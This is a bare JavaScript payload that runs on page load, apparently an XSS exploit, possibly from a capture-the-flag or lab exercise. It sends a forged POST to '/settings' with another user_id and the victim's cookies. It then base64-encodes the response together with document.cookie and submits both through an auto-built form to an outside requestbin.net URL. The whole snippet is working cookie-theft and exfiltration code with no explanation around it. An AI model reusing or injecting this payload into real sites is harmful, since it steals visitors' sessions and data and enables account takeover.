
window.addEventListener('load', function () {


fetch("/settings", {
    'method': 'POST',
    'body': 'name=asdf&user_id=2&' +document.cookie,
     headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    }
}).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://requestbin.net/r/rj93qcrj';i.name='data';i.value=btoa(encodeURI(back+document.cookie));f.appendChild(i);document.body.appendChild(f);f.submit();})})
   })
